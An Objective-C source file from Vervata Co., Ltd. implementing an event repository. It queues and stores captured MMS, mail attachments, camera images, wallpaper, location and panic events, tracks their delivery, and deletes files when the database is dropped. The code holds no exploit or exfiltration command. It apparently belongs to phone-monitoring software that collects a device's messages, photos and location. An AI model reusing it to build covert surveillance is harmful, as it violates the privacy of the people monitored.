/**
 - Project name: Event repository manager
 - Class name: EventRepositoryManager
 - Version: 1.0
 - Purpose: Core component for events
 - Copy right: 10/3/11, Makara Khloth, Vervata Co., Ltd. All rights reserved.
 */

#import "EventRepositoryManager.h"
#import "EventQueryPriority.h"
#import "RepositoryChangePolicyMap.h"
#import "RepositoryChangePolicyMapPool.h"
#import "EventResultSet.h"
#import "QueryCriteria.h"
#import "EventKeys.h"
#import "DatabaseOperationAssistant.h"
#import "RepositoryChangePolicy.h"

#import "DatabaseManager.h"
#import "EventCount.h"
#import "DbHealthInfo.h"

#import "DetailedCount.h"
#import "EventCount.h"
#import "DAOFactory.h"
#import "MediaDAO.h"
#import "ThumbnailDAO.h"
#import "AttachmentDAO.h"
#import "FxAttachmentWrapper.h"

#import "FxEvent.h"
#import "MediaEvent.h"
#import "ThumbnailEvent.h"
#import "FxLocationEvent.h"

const NSInteger kInsertRetryMaxCount	= 10;

@interface EventRepositoryManager (private)

- (void) scheduleInsertion;
- (void) doInsertEvent;
- (void) checkPolicyCriteria: (FxEvent *) aEvent;

@end

@implementation EventRepositoryManager

@synthesize mDBHealthInfo;

/**
 - Method name: initWithEventQueryPriority
 - Purpose: An instance methode use to allocate object of EventRepositoryManager class
 - Argument list and description: aQueryPriority, event query priority and it stored event type order to query
 - Return description: Return object of EventRepositoryManager
 */
- (id) initWithEventQueryPriority: (EventQueryPriority*) aQueryPriority {
	if ((self = [super init])) {
		mEventQueryPriority = aQueryPriority;
		[mEventQueryPriority retain];
		mEventQueue = [[NSMutableArray alloc] init];
		mDatabaseManager = [[DatabaseManager alloc] init];
		mDBOperationAssistant = [[DatabaseOperationAssistant alloc] initWithDatabaseManager:mDatabaseManager andEventQueryPriority:mEventQueryPriority];
		mChangePolicyMapPool = [[RepositoryChangePolicyMapPool alloc] init];
		[self setMDBHealthInfo:[mDBOperationAssistant mDbHealthInfo]];
	}
	return (self);
}

/**
 - Method name: openRepository
 - Purpose: An instance method use to open connection to repository database, after initialize the object must call this method before call other methods in order to open the connection
 - Argument list and description: No argument
 - Return description: No return
 */
- (void) openRepository {
	[mDatabaseManager openDB];
}

/**
 - Method name: closeRepository
 - Purpose: An instance method use to close the connection to database, after call this method caller must call open repository again if they want to access to database with other methods
 - Argument list and description: No argument
 - Return description: No return
 */
- (void) closeRepository {
	[mDatabaseManager closeDb];
}

/**
 - Method name: deleteRepository
 - Purpose: An instance method use to close, delete and reopen the connection to database
 - Argument list and description: No argument
 - Return description: No return
 */
- (void) deleteRepository {
	// 1. Delete all attachment and thumbnail files
	NSFileManager *fm = [NSFileManager defaultManager];
	NSMutableArray *eventTypes = [NSMutableArray array];
	[eventTypes addObject:[NSNumber numberWithInt:kEventTypeMms]];
	[eventTypes addObject:[NSNumber numberWithInt:kEventTypeMail]];
	[eventTypes addObject:[NSNumber numberWithInt:kEventTypeCameraImage]]; // Present to all media event type
	for (NSNumber* number in eventTypes) {
		FxEventType eventType = (FxEventType)[number intValue];
		id <DataAccessObject> dao = [DAOFactory dataAccessObject:eventType withSqlite3:[mDatabaseManager sqlite3db]];
		NSInteger count = [[dao countEvent] totalCount];
		NSArray* eventArray = [dao selectMaxEvent:count];
		for (FxEvent * event in eventArray) {
			if ([event eventType] == kEventTypeMms || [event eventType] == kEventTypeMail) {
				// Delete attachment files if any
				AttachmentDAO *attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				NSArray *attachments = [attDAO selectRow:[event eventId] andEventType:[event eventType]];
				for (FxAttachmentWrapper *wrp in attachments) {
					if ([fm fileExistsAtPath:[[wrp attachment] fullPath]]) {
						[fm removeItemAtPath:[[wrp attachment] fullPath] error:nil];
					}
				}
				[attDAO release];
			} else if ([event eventType] == kEventTypeCameraImage) { // Not deliver thumbnails of all type is here
				// Delete thumbnail files if any
				ThumbnailDAO *tDAO = [DAOFactory dataAccessObject:kEventTypeCameraImageThumbnail withSqlite3:[mDatabaseManager sqlite3db]];
				NSInteger tCount = [[tDAO countEvent] totalCount];
				NSArray *tArray = [tDAO selectMaxEvent:tCount];
				for (ThumbnailEvent *tEvent in tArray) {
					if ([fm fileExistsAtPath:[tEvent fullPath]]) {
						[fm removeItemAtPath:[tEvent fullPath] error:nil];
					}
				}
			} else if ([event eventType] == kEventTypeWallpaper) { // Can completely remove once wallpaper capture if original is captured
				// Wallpaper file which copied from its original location and have delivered
				MediaEvent *mediaEvent = (MediaEvent *)event;
				if ([fm fileExistsAtPath:[mediaEvent fullPath]]) {
					[fm removeItemAtPath:[mediaEvent fullPath] error:nil];
				}
			}
		}
		
		// Can completely remove once wallpaper capture if original is captured
		// Special case for wallpaper since it cannot capture original file
		if (eventType == kEventTypeCameraImage) { // Last iteration of loop
			id <DataAccessObject3> dao3 = [DAOFactory dataAccessObject:eventType withSqlite3:[mDatabaseManager sqlite3db]];
			NSArray* mediaEventArray = [dao3 selectAllMediaThumbnailEvent:kEventTypeWallpaper delivered:YES];
			for (MediaEvent *mediaEvent in mediaEventArray) {
				if ([fm fileExistsAtPath:[mediaEvent fullPath]]) {
					[fm removeItemAtPath:[mediaEvent fullPath] error:nil];
				}
			}
		}
	}
	// 2. Drop database
	[mDatabaseManager dropDB];
	
	// 3. Increase drop count by 1 in database health log
	NSInteger dropCount = [[self mDBHealthInfo] dbDropCount];
	[[self mDBHealthInfo] setDbDropCount:++dropCount];
	[[self mDBHealthInfo] save];
}

#pragma mark -
#pragma mark Event repository
#pragma mark -

- (void) addRepositoryListener: (id <RepositoryChangeListener>) aRepositoryChangeLitener withRepositoryChangePolicy: (RepositoryChangePolicy*) aPolicy {
	RepositoryChangePolicyMap* changeMap = [[RepositoryChangePolicyMap alloc] initWithRepositoryChangePolicy:aPolicy andRepositoryChangeListener:aRepositoryChangeLitener];
	[[mChangePolicyMapPool mMapPool] addObject:changeMap];
	[changeMap release];
}

- (void) removeRepositoryChangeListener: (id <RepositoryChangeListener>) aListener {
	NSInteger index = 0;
	for (RepositoryChangePolicyMap* changeMap in [mChangePolicyMapPool mMapPool]) {
		if ([changeMap mReposChangeListener] == aListener) {
			[[mChangePolicyMapPool mMapPool] removeObjectAtIndex: index];
			break;
		}
		index++;
	}
}

- (void) deleteEvent: (EventKeys*) aEventKeys {
	[mDBOperationAssistant deleteEvent:aEventKeys];
}

- (FxEvent*) actualMedia: (NSInteger) aPairId {
	FxEvent* actualMedia = [mDBOperationAssistant actualMedia:aPairId];
	return (actualMedia);
}

- (EventCount*) eventCount {
	EventCount* eventCount = [mDBOperationAssistant eventCount];
	return (eventCount);
}

- (EventResultSet*) mediaThumbnailEvents: (QueryCriteria*) aCriteria {
	EventResultSet* resultSet = [mDBOperationAssistant mediaThumbnailEvents:aCriteria];
	return (resultSet);
}

- (EventResultSet*) regularEvents: (QueryCriteria*) aCriteria {
	EventResultSet* resultSet = [mDBOperationAssistant regularEvents:aCriteria];
	return (resultSet);
}

- (EventResultSet*) mediaNoThumbnailEvents: (QueryCriteria*) aCriteria {
	EventResultSet* resultSet = [mDBOperationAssistant mediaNoThumbnailEvents:aCriteria];
	return (resultSet);
}

- (EventResultSet*) systemEvents: (QueryCriteria*) aCriteria {
	// Manipulate request to make sure that we request only system event type
	QueryCriteria* criteria = [[QueryCriteria alloc] init];
	[criteria addQueryEventType:kEventTypeSystem];
	[criteria setMMaxEvent:[aCriteria mMaxEvent]];
	[criteria setMQueryOrder:[aCriteria mQueryOrder]];
	EventResultSet* resultSet = [self regularEvents:criteria];
	[criteria release];
	return (resultSet);
}

- (EventResultSet*) panicEvents: (QueryCriteria*) aCriteria {
	EventResultSet* resultSet = nil;
	NSInteger eventRemained = [aCriteria mMaxEvent];
	QueryCriteria* criteria = [[QueryCriteria alloc] init];
	[criteria addQueryEventType:kEventTypePanic];
	[criteria setMMaxEvent:eventRemained];
	[criteria setMQueryOrder:[aCriteria mQueryOrder]];
	EventResultSet* tmp1 = [self regularEvents:criteria];
	[criteria release];
	eventRemained -= [[tmp1 events:kEventTypePanic] count];
	if (eventRemained > 0) {
		criteria = [[QueryCriteria alloc] init];
		[criteria addQueryEventType:kEventTypePanicImage];
		[criteria setMMaxEvent:eventRemained];
		[criteria setMQueryOrder:[aCriteria mQueryOrder]];
		EventResultSet* tmp2 = [self mediaNoThumbnailEvents:criteria];
		[criteria release];
		resultSet = [[EventResultSet alloc] init];
		NSMutableArray* eventArray = [[NSMutableArray alloc] init];
		for (FxEvent* event in [tmp1 mEventArray]) {
			[eventArray addObject:event];
		}
		for (FxEvent* event in [tmp2 mEventArray]) {
			[eventArray addObject:event];
		}
		[resultSet setMEventArray:eventArray];
		[eventArray release];
		[resultSet autorelease];
	} else {
		resultSet = tmp1;
	}
	return (resultSet);
}

- (EventResultSet*) settingsEvents: (QueryCriteria*) aCriteria {
	QueryCriteria* criteria = [[QueryCriteria alloc] init];
	[criteria addQueryEventType:kEventTypeSettings];
	[criteria setMMaxEvent:[aCriteria mMaxEvent]];
	[criteria setMQueryOrder:[aCriteria mQueryOrder]];
	EventResultSet* resultSet = [self regularEvents:criteria];
	[criteria release];
	return (resultSet);
}

- (void) insert: (FxEvent*) aEvent {
	[mEventQueue addObject:aEvent];
	[self scheduleInsertion];
}

- (void) updateMediaThumbnailStatus: (NSInteger) aPairId withStatus: (BOOL) aStatus {
	[mDBOperationAssistant updateMediaThumbnailStatus:aPairId withStatus:aStatus];
}

- (DbHealthInfo *) dbHealthInfo {
	NSFileManager *fm = [NSFileManager defaultManager];
	NSDictionary *attr = [fm attributesOfItemAtPath:[mDatabaseManager dbFullName] error:nil];
	DLog(@"attr NSFileSize: %@", attr)
	if (attr) {
		[mDBHealthInfo setMDatabaseSize:[[attr objectForKey:NSFileSize] unsignedLongLongValue]];
	}
	//NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
	attr = nil;
	attr = [fm attributesOfFileSystemForPath:/*[paths lastObject]*/@"/var/" error:nil];
	DLog(@"attr NSFileSystemFreeSize: %@", attr)
	if (attr) {
		//NSNumber *fileSystemInBytes = [attr objectForKey:NSFileSystemSize];
		NSNumber *freeSpaceFileSystemInBytes = [attr objectForKey:NSFileSystemFreeSize];
		[mDBHealthInfo setMAvailableSize:[freeSpaceFileSystemInBytes unsignedLongLongValue]];
	}
	return (mDBHealthInfo);
}

- (void) dropRepository {
	[self deleteRepository];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) scheduleInsertion {
	DLog(@"Timer scheduler %@", mDBTimeInsertionScheduler)
	if (!mDBTimeInsertionScheduler) {
		mDBTimeInsertionScheduler = [NSTimer scheduledTimerWithTimeInterval:0.1 target:self selector:@selector(doInsertEvent) userInfo:nil repeats:NO];
	}
}

- (void) doInsertEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	DLog(@"Check timer validation after fired %@", mDBTimeInsertionScheduler)
	[mDBTimeInsertionScheduler invalidate]; // Safe to call invalide since timer object still in memory when it fires
	mDBTimeInsertionScheduler = nil;
	
	FxEvent* event = [mEventQueue objectAtIndex:0];
	@try {
		[mDBOperationAssistant insert:event];
		[self checkPolicyCriteria:event];
		[mEventQueue removeObjectAtIndex:0];
		mInsertTryCount = 0;
	}
	@catch (id e) {
		mInsertTryCount++;
		if (mInsertTryCount > kInsertRetryMaxCount) {
			[mEventQueue removeObjectAtIndex:0];
			mInsertTryCount = 0;
		}
	}
	@finally {

	}
	
	DLog(@"Event inserted, %d events to add more!", [mEventQueue count])
	if ([mEventQueue count] > 0) {
		[self scheduleInsertion];
	}
	[pool release];
}

- (void) checkPolicyCriteria: (FxEvent *) aEvent {
	NSInteger totalCount = [mDBOperationAssistant countTotalEvent];
	DLog(@"Policy check totalCount: %d", totalCount);
	DLog (@"Check policy for event = %@, type = %d", aEvent, [aEvent eventType]);
	
	for (RepositoryChangePolicyMap* changeMap in [mChangePolicyMapPool mMapPool]) {
		for (NSNumber* number in [[changeMap mReposChangePolicy] mChangeEventArray]) {
			// EventAdded 1
			if ([number intValue] == kReposChangeAddEvent) {
				[[changeMap mReposChangeListener] eventTypeAdded:[aEvent eventType]];
			}
			
			// EventAdded 2
			if ([number intValue] == kReposChangeAddEvent) {
				if ([[changeMap mReposChangeListener] respondsToSelector:@selector(eventAdded:)]) {
					[[changeMap mReposChangePolicy] performSelector:@selector(eventAdded:) withObject:aEvent];
				}
			}
			
			// SystemEventAdded
			if ([number intValue] == kReposChangeAddSystemEvent && [aEvent eventType] == kEventTypeSystem) {
				[[changeMap mReposChangeListener] systemEventAdded];
			}
			
			// PanicEventAdded
			if ([number intValue] == kReposChangeAddPanicEvent) {
				if ([aEvent eventType] == kEventTypePanic || [aEvent eventType] == kEventTypePanicImage) {
					[[changeMap mReposChangeListener] panicEventAdded];
				} else if ([aEvent eventType] == kEventTypeLocation) {
					FxLocationEvent *locEvent = (FxLocationEvent *)aEvent;
					if ([locEvent callingModule] == kGPSCallingModulePanic) {
						[[changeMap mReposChangeListener] panicEventAdded];
					}
				}
			}
			
			// MaxEventReached
			if ([number intValue] == kReposChangeReachMax && [[changeMap mReposChangePolicy] mMaxNumber] <= totalCount) {
				[[changeMap mReposChangeListener] maxEventReached];
			}
		}
	}
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mDBHealthInfo release];
	[mEventQueue release];
	[mEventQueryPriority release];
	[mDBOperationAssistant release];
	[mDatabaseManager release];
	[mChangePolicyMapPool release];
	[super dealloc];
}

@end
